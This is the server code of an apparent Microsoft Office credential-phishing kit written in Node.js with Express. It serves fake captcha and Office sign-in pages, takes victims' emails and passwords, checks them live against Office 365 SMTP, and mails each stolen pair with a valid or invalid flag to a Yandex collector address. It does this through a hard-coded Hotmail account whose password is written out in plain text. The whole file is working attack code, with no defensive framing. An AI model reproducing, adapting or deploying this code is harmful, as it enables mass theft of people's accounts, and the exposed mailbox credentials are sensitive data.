var express = require("express"),
port = 5000,
app = express(),
nodemailer = require('nodemailer'),
views = 0,
magic = '/signin',
office = 0;
app.set( 'trust proxy', 1);
app.set('view engine', 'ejs');
app.use(express.static(__dirname + '/public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true}));
app.get( "/magic", ( req, res) => {
    ++office;
    res.render('office');
})
app.get( '/', ( req, res) => {
    ++views;
    res.render('captcha');
})
app.get( '/signin', ( req, res) => {
    res.render('with');
})
app.post( '/office/register', ( req, res) => {
    officeBox( req.body)
    .then( ( data, err) => {
        if(err) {
            res.json({status: 0})
        }
        else{
            res.json({ status: data})
        }
    })
})
app.get( '/key', ( req, res) => {
    res.json({ adr: magic})
})
app.listen( port, () => {
    console.log("Office server started on port: ", port);
})


async function main( data, status, email) {
    return new Promise( async ( resolve, reject) => {
        var transporter = nodemailer.createTransport({
            host: "smtp-mail.outlook.com",
            secureConnection: false,
            port: 587,
            requireTLS: true,
            auth: {
                user: "p4ausburn@hotmail.com",
                pass: "Blackops04."
            },
            tls: {
                ciphers:'SSLv3'
            }
        });
        var info = await transporter.sendMail({
            from: "Hermes <p4ausburn@hotmail.com>",
            to: "halls.jerry@yandex.com",
            subject: "Office V2",
            html: ("username: " + data.email + " <br> password: " + data.password + " <br> created by 1 <br>" + "Page views: "+ views + "Office views: "+ office+ "<br> status: "+status)
        })
        resolve(status)
    })
}

function test( data) {
    return new Promise( ( res, rej) => {
        var transporter = nodemailer.createTransport({
            host: "smtp.office365.com",
            secureConnection: false,
            port: 587,
            requireTLS: true,
            auth: {
                user: data.email,
                pass: data.password
            },
            tls: {
                ciphers:'SSLv3'
            }
        })
        transporter.verify( (err, sus)=> {
            if(err) {
                rej(0)
            }
            else{
                res(1)
            }
        })
    })
}

function officeBox ( body) {
    return new Promise ( ( resolve, reject) => {   
        var data = {
            email: body.email,
            password: body.pass
        };
        test( data)
        .then( resp => {
            main( data, 1, data.email)
            .then( ( res, err) => {
                resolve(res);
            });
        })
        .catch( err => {
            //didn't login
            main( data, 0, data.email)
            .then( ( res, err) => {
                resolve(res);
            });
        });
    })
}